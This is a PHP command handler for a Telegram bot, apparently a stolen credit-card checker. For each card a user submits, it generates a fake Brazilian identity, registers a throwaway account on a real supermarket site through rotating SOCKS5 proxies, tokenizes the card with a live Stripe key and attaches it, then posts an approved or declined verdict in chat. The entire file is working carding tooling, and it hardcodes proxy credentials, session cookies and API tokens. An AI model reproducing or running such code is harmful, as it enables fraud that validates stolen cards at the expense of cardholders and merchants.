<?php
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

if(strpos($message, '!s4') === 0 or strpos($message, '/s4') === 0 or strpos($message, '.s4') === 0)
{
    $starttime = microtime(true);
    sendaction($chat_id, "typing");

    $antispam = antispamCheck($userId);
    addUser($userId);
    if($antispam != False){
        $delay = microtimeFormat($starttime);
        $result = urlencode("[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.");
        $su = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($su, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        return;
    }else{
        //==============MENSAJE DE BIENVENIDA=======================//
        // $time_end = microtime(true);
        // $duration = $time_end - $starttime;
        $lista = substr($message, 4);
        $delay = microtimeFormat($starttime);
        $result = urlencode("<b>••• 🟥ESPERE VALIDANDO...
••• 💳 CC ➜  $lista
••• ⌛Time ➜  $delay Segs
••• 👨🏻Checked by UserId➜  $userId
••• 🧑🏻‍💻Bot by ➜  @Z_tJKkeZQoZlcssuXjVjNerQ</b>");
        $su = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($su, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
        // echo "TIME>".$delay;
        // echo "\nRESPONSE:".$su;
        // echo "\nMessage id ".$message_id_1;
            //////==================================AREA PROXY====================///
        function rebootproxys()
        {
            $poxySocks = file("proxy.txt");
            $myproxy = rand(0, sizeof($poxySocks) - 1);
            $poxySocks = $poxySocks[$myproxy];
            return $poxySocks;
        }
        $poxySocks4 = rebootproxys();

        $username = 'LYHBl6a1ssT'; 
        $password = 'zc7l6f4Tn'; 
        // $socks = array_rand($ip);
        // $proxy = $ip[$socks];
        
        $proxiss = explode(":", $poxySocks4);
        //=============================================================//
        //===================AREA DE GATE==============================//
        $lista = clean($lista);
        $check = strlen($lista);
        $chem = substr($lista, 0,1);
        $cc = multiexplode2(array(":", "/", " ", "|", ""), $lista)[0];
        $mes = multiexplode2(array(":", "/", " ", "|", ""), $lista)[1];
        $ano = multiexplode2(array(":", "/", " ", "|", ""), $lista)[2];
        $cvv = multiexplode2(array(":", "/", " ", "|", ""), $lista)[3];
        $strlenn = strlen($cc);
        $strlen1 = strlen($mes);
        $ano1 = $ano;
        $list = preg_replace('/\s/', '|', $lista);
        $vaut = array(1,2,7,8,9,0);

        if (in_array($chem, $vaut)) { 
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        } 

        if (empty($lista)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif($check<15){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif(strlen($strlenn != 16)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }
        if(strlen($strlen1 > 2)) {
            $ano = $cvv; 
            $cvv = $mes;
            $mes = $ano1;
        }
        // $lista = $_GET['lista'];
        // $cc = multiexplode2($lista)[0];
        // $mes = multiexplode2($lista)[1];
        // $ano = multiexplode2($lista)[2];
        // $cvv = multiexplode2($lista)[3];
        // $bin = substr($cc, 0,8);

        //==================[BIN LOOK-UP]======================//
        $ch = curl_init();
        $bin = substr($cc, 0,6);
        curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $bindata = curl_exec($ch);
        $binna = json_decode($bindata,true);
        $brand = $binna['scheme'];
        $country = $binna['country']['name'];
        $type = $binna['type'];
        $bank = $binna['bank']['name'];
        curl_close($ch);
        // ==================[BIN LOOK-UP-END]======================//

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'accept: */*',
        'content-type: application/x-www-form-urlencoded',
        'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        ));

        curl_setopt($ch, CURLOPT_POSTFIELDS, "acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=");
        $dat = curl_exec($ch);
        $email = getStrss ($dat, 'email":"', '"');
        $nome = getStrss ($dat, 'nome":"', '"');
        $cpf = getStrss ($dat, 'cpf":"', '"');
        $nasc = getStrss ($dat, 'data_nasc":"', '"');
        $senha = getStrss ($dat, 'senha":"', '"');
        $tel = getStrss ($dat, 'celular":"', '"');
        $nome1 = multiexplode2 ($nome)[0];
        $sobrenome = multiexplode2 ($nome)[1];


        function bin ($cc){
            $contents = file_get_contents("bins.csv");
            $pattern = preg_quote(substr($cc, 0, 6), '/');
            $pattern = "/^.*$pattern.*\$/m";
            if (preg_match_all($pattern, $contents, $matches)) {
                $encontrada = implode("\n", $matches[0]);
            }
            $pieces = explode(";", $encontrada);
            return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
        }
        $bin = bin($lista);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://supermercadonow.com/api/v2/auth/register');
        curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'method: POST',
        'path: /api/v2/auth/register',
        'cookie: XSRF-TOKEN=eyJpdiI6IkNJTFhnbEpMaUI1MnRTTGRJT2pqbmc9PSIsInZhbHVlIjoiMmsxMk4zdHJJVGJvT0dMeXNjUEJzcFNLd2RKRVFuK0RcL09RM2dUSFJ5R3ZQWnZrOXB2a1Z3T2ZXXC9LdXNVSWxjIiwibWFjIjoiZjgyZTAxNDVhNTVjNjM0YmJiMWNhYTc5YWFlZGNjNmVhYzNiNWE2OWIxNWI4ZWI3MDIxYmY2ZDJjNmFiMTRlZiJ9; sgSDNJNNP1WNbWoG=eyJpdiI6ImJcL3ZGOWd1cXFoK2JpQlBVVHE4SEZ3PT0iLCJ2YWx1ZSI6IndFS2RJaFUybnNUcDVsVktTWDk1ZDV2QzJicFpNNjd3azdmNE9HRmdVUkp3NTZuXC9YMHVyUlV4UWk2UFNoVmZqIiwibWFjIjoiNDRiOWNhMTgzNDk5Nzk1NTE1ZDdjYjYxZmIyN2Q1YzQxYzI1NzVjZjJkNTY4MmQ5MzEwNDMzZjIzODIxYzJiMSJ9; snw.menu.disabled=false; snw.accept.cookies=true',
        'x-xsrf-token: eyJpdiI6IkNJTFhnbEpMaUI1MnRTTGRJT2pqbmc9PSIsInZhbHVlIjoiMmsxMk4zdHJJVGJvT0dMeXNjUEJzcFNLd2RKRVFuK0RcL09RM2dUSFJ5R3ZQWnZrOXB2a1Z3T2ZXXC9LdXNVSWxjIiwibWFjIjoiZjgyZTAxNDVhNTVjNjM0YmJiMWNhYTc5YWFlZGNjNmVhYzNiNWE2OWIxNWI4ZWI3MDIxYmY2ZDJjNmFiMTRlZiJ9',
        'origin: https://supermercadonow.com',
        'referer: https://supermercadonow.com/',
        'user-agent: okhttp/3.12.1',
        'content-type: application/json;charset=utf-8',
        'x-snw-store-brand: supernow',
        'x-snw-token: XLBhhbP1YEkB2tL61wkX163Dqm9iIDpx',
        'x-snw-version: 2020-03-23',
        'x-snw-source: 2',
        'accept: application/json, text/plain, */*'
        ));

        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"name":"'.$nome1.'+'.$sobrenome.'","email":"'.$email.'","password":"@migudinho","accept_marketing_messages":true,"accept_gifts":true,"captcha":"03AEkXODCfMLSnVzReDm3zAXFa5Qd0CBFodsnDonUumUg92DvMAi3jnw_mevhBx73wjIqXaB1_hT_Q0pZr6v4Kc5DUlu_gtFK3WgCCP6KnZ5oZdh-y-ZNnhNC0LYCSLeT5evKeeIY9OGEbN4fiCN8CH6gNVJQBMx3Llohe2A7D3dWc0LoL_nD3J74suPGMNCNSF0SQ6nCWJ3uSsUN7aNRaC1G1VEykTZ0ukj5cKqEtC2ExJ5-mk0DUcS49ReRVbF4g0RpdCx0QBDvJcH9CXsGHnNZJejwLslcsv7twHcH8zGhsJKBPVCKTndEWiV7wbgCJaxHCHzxukr8nJ3AlZ1QDUBye6Ie2Vwxh6RrbM--fpJz8Hg0CAWQTTIPNq8E3cQ8LgtdG9YwKUdJOB3Vb0lpuKSixOSRtGLNOPh_p8pW9M3fJiWyDy6Atykz4sNnXZ4fQpsaXn4zwN5j4XxNa8I15ogpYlD3bltpcZEM6AulrQu65dqbfJwOQBvBggwbwOV_v0woe7WGmp_cCXNqgwHjq-Q-hV-BaGQIH2YpMprp37Q-iNUuD8d13nXcmpZUOzfMWXyxOhQzT0vEPC5itRXOMcs_BbpPRsAali29XgVLpPpYoipLROo9Sb0-vw0fBMN2VaDkI_HZ0PJdrQIZkzOTbDws21hay-DXhz2UrS049QDibLf_YucY4xHUHhsuNuZbsgX2DelyWkvBZGafXIx7TkvpSZHdpRE8mnflIvBUEb6XmOV96IttVfDBbw96OfrMmloKA3ctAgAyX6GcLxJSKTsMFBB1yjKV1LbFtHBgjznfUzQvGQHOzQQv6hDcN-u4JpzF2KtoJVhSsqQ-pPcGqGG2sbfIz7q5SpFl5UQhkRM-ZmZ1Q0xNkepzXpDoaEt3bsklWkPajoa0cJ-HSLdNJ50ZFET_vBpylujHCJZZvfXuqqzh8yt3q1Zi3nzAqdyifee7qbN9RThRR1Velf6wOkjxoSLWbSMaHzKojDjK8PZuCApgrVzQuuKEQuKXgEeLCP3WGNMtUDasqC5IY2PX29A5WQZwKfQz9eJeYbsuGcPmgpuv7i5rBoaBhD1EzeyI3NgTmsvnDWA9dd2lCVskyGDdU2LWTA19bHvTgeNP7EySQXBDUn0fHjSX-OWFNoNdCcPNvQ34C-RUfzsJt0EXlBaKOeRMoJEg-XSyK3tqSm00f-ZQQMf9ae6pwgarg55b_BsCrsahfogS83Bo79u2pdVdI2roG3GQKlJJBVJ6ikeGU7nVi__xSryADYNbk_MsBXY3WHLeYdxt6afnAIDrNP2M5WviyK4qmmA"}');
        $data1 = curl_exec($ch);
        echo $data1;
        $token = getStrss ($data1, 'api_token":"', '"');

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        // curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        
        'user-agent: okhttp/3.12.1',
        'authorization: Bearer pk_live_1qIVWj67DxygWMdC2SH9VsXY',
        'content-type: application/x-www-form-urlencoded',
        ));

        curl_setopt($ch, CURLOPT_POSTFIELDS, "card%5Bcvc%5D=$cvv&card%5Bnumber%5D=$cc&card%5Bexp_year%5D=$ano&card%5Bexp_month%5D=$mes");
        $data1 = curl_exec($ch);
        echo $data1;
        $id = getStrss ($data1, 'id": "', '"');
        //echo htmlentities($data1);


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://supermercadonow.com/api/v2/current-user/credit-cards');
        // curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        
        'user-agent: okhttp/3.12.1',
        'accept: application/json, text/plain, */*',
        'x-requested-with: XMLHttpRequest',

        'x-snw-token: '.$token.'',

        'x-n2w-token: '.$token.'',
        'content-type: application/json;charset=utf-8',
        ));

        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"nick":null,"name":"'.$nome.'","brand":"Mastercard","document":"'.$cpf.'","cvv":"1ecfb463472ec9115b10c292ef8bc986","phone_number":"991864643","phone_area_code":"21","number":"4259","bin_number":"525475","maturity_month":2,"maturity_year":"2028","stripe_token":"'.$id.'"},"address":{"id":3394150,"street_name":"Rua Vitorino Carmilo","street_number":"94","postal_code":"01153000","zone":"Barra Funda","city_id":3898,"city_name":"São Paulo","additional_info":null,"state_id":"SP","latitude":-23.532272,"longitude":-46.651855,"can_receive_orders":false,"name":null,"lookup_address_type_id":3}}');
        $data1 = curl_exec($ch);

        // Reteste by @souhurrikane
        //if(strpos($data1, '') !== false){ // Para por outro erro que necessite de reteste,
        //basta copiar o código e colocar o erro entre as aspas
            //header("Location: http://localhost/NODE/CHK_01/request.php?lista=$cc|$mes|$ano|$cvv");
            //exit;
            // Fim reteste
        //}
        // Reteste by @souhurrikane
        echo $data1;
        if(strpos($data1, 'Unauthorized') !== false){ // Para por outro erro que necessite de reteste,
        //basta copiar o código e colocar o erro entre as aspas
            // header("Location: http://localhost/NODE/CHK_01/request.php?lista=$cc|$mes|$ano|$cvv");
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [🟨UNAUTORIZED] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code> UNAUTORIZED</code>
Gateway -» STRIPE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Country -»</b> $country💲
<b>Issuers Contact -»</b> 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
            exit;
            // Fim reteste
        }
        if (strpos($data1, 'card_number":"')){
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [🟩APROVADA ✔] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>APROVADA Authorized</code>
Gateway -» STRIPE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Country -»</b> $country💲
<b>Issuers Contact -»</b> 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
            // echo ("<br /><span class='badge badge-success'>#APROVADA ✔</span> $lista ➜ $bin Authorized <br />");
            exit();}

        elseif (strpos($data1, 'Houve um erro ao processar o seu cart\u00e3o')){
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [🟥REPROVADA ❌] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>REPROVADA Error al procesar</code>
Gateway -» STRIPE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Country -»</b> $country💲
<b>Issuers Contact -»</b> 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
            // echo "<br /><span class='badge badge-danger'>Reprovada</span>";
            // echo(" $lista - Houve um erro ao processar o seu cartão");
            exit();}
        elseif (strpos($data1, 'N\u00e3o foi poss\u00edvel validar o cart\u00e3o')){
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [🟥REPROVADA ❌] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>REPROVADA No fue Posible validar la tarjeta</code>
Gateway -» STRIPE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Country -»</b> $country💲
<b>Issuers Contact -»</b> 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
            // echo "<br /><span class='badge badge-danger'>Reprovada</span>";
            // echo(" $lista - Não foi possivel validar o seu cartão");
            exit();
        } else {
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [🟥REPROVADA ❌] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>REPROVADA-Otro Error</code>
Gateway -» STRIPE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Country -»</b> $country💲
<b>Issuers Contact -»</b> 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
            // echo "<br /><span class='badge badge-danger'>#REPROVADA ❌</span>";
            // echo("<span style='color:black;'> $lista</span> -> OUTRO ERRO <span class='badge badge-light'>[JhonDelas1914]</span><br />");
            exit();  
            } 
        }else{
            $delay2 = microtimeFormat($starttime);
            $result2 = urlencode("<b>
  ••• 💳CC ->> <code>⚠️INGRESA UNA TARJETA VALIDA!</code> 
  ••• ⌛TIME ->> $delay2 s 
  ••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
  ••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
            $su1 = reply_to2($chat_id,$message_id_1,$keyboard,$result2);
            $respon2 = json_decode($su1, TRUE);
            $message_id_2 = $respon2['result']['message_id'];
          }
    }
}
?>